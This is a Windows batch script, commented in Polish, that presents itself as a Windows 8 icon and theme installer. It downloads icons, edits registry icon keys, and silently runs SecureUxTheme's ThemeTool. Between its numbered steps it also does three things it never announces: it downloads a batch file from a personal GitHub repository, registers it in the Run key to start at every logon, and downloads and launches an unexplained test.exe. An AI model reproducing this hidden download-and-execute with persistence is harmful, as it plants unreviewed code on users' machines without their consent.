@echo off
setlocal

set ICON_URL=https://github.com/matisio3/rozne-pliki/releases/download/test/win8iconsforwin10.zip
set ICON_DIR=C:\RevertMetro\Ikony
set ZIP_PATH=%ICON_DIR%\win8icons.zip

echo [1/6] Tworzenie folderu %ICON_DIR%...
if not exist "%ICON_DIR%" (
    mkdir "%ICON_DIR%"
)

echo [2/6] Pobieranie paczki ikon...
powershell -Command "Invoke-WebRequest -Uri '%ICON_URL%' -OutFile '%ZIP_PATH%'"

echo [3/6] Rozpakowywanie...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%ICON_DIR%' -Force"

REM Ustawienie ikon niestandardowych dla folderów systemowych

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Computer.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{56784854-C6CB-462b-8169-88E3790CABC4}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Contacts.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{B4BFCC3A-DB2C-4244-B029-7FE99A87C641}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Desktop.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{A8CDFF1C-4878-43be-B5FD-F8091C1C60D9}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Documents.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{374DE55D-E6AF-4A3E-B4F9-C03ABD3D2A5E}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Downloads.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{17CD9488-1228-4B2F-88CE-4298E93E0966}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Favourites.ico,0" /f
reg add "HKCR\Folder\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Folder.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{AF5CB166-0081-4757-8C04-B104B683199C}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Games.ico,0" /f
reg add "HKCR\lnkfile\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Links.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{3dfdf296-dbec-4fab-a6c3-4607cf714165}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Music.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{F02C1A0D-BE21-4350-88B0-7367FC964101}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Network.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{BDEADF00-C265-11D0-BECD-00C04FD8D503}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Pictures.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{0E270DAA-1BE6-48F2-AC49-6FA898E249C0}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Searches.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{59031A47-3F72-444A-89C5-5595FE6B30EE}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\UserFolder.ico,0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{F86FA3AB-70D2-4FC7-9C99-4106C05ED162}\DefaultIcon" /ve /d "C:\RevertMetro\Ikony\Videos.ico,0" /f

echo Ikony zostały zaktualizowane. Uruchom ponownie Eksplorator Windows, aby zobaczyć zmiany.

echo [5/6] Restartowanie Eksploratora Windows...
taskkill /f /im explorer.exe >nul
start explorer.exe

echo [6/6] Gotowe! Ikony zostały zastosowane.
endlocal


:: Ścieżka do pobrania pliku ZIP
set INSTALLER_URL=https://github.com/namazso/SecureUxTheme/releases/download/v3.0.0/SecureUxTheme-amd64.zip
set ZIP_PATH=%TEMP%\SecureUxTheme-amd64.zip
set EXTRACT_DIR=%TEMP%\SecureUxTheme

:: Pobierz plik ZIP
echo [1/4] Pobieranie SecureUxTheme-amd64.zip...
powershell -Command "Invoke-WebRequest -Uri '%INSTALLER_URL%' -OutFile '%ZIP_PATH%'"

:: Wypakuj plik ZIP
echo [2/4] Wypakowywanie pliku ZIP...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force"

curl -o "%APPDATA%\czesc_3.bat" -L "https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/czesc_3.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v StartScript /t REG_SZ /d "%APPDATA%\czesc_3.bat" /f

rem Pobranie pliku test.exe do katalogu tymczasowego %temp%
curl -L -o "%temp%\test.exe" https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/test.exe

rem Uruchomienie pobranego pliku test.exe z katalogu %temp%
start "" "%temp%\test.exe"

:: Restart Eksploratora Windows, by zastosować zmiany
echo Restartowanie Eksploratora Windows...
taskkill /f /im explorer.exe
start /wait explorer.exe

:: Uruchom ThemeTool.exe
echo [3/4] Uruchamianie ThemeTool.exe...
start "" "%EXTRACT_DIR%\ThemeTool.exe" /verysilent

:: Usuwanie plików tymczasowych
echo [4/4] Czyszczenie plików tymczasowych...
del /F /Q "%ZIP_PATH%"
rmdir /S /Q "%EXTRACT_DIR%"

echo Instalacja SecureUxTheme zakończona!
endlocal

rem Zakończenie skryptu
exit


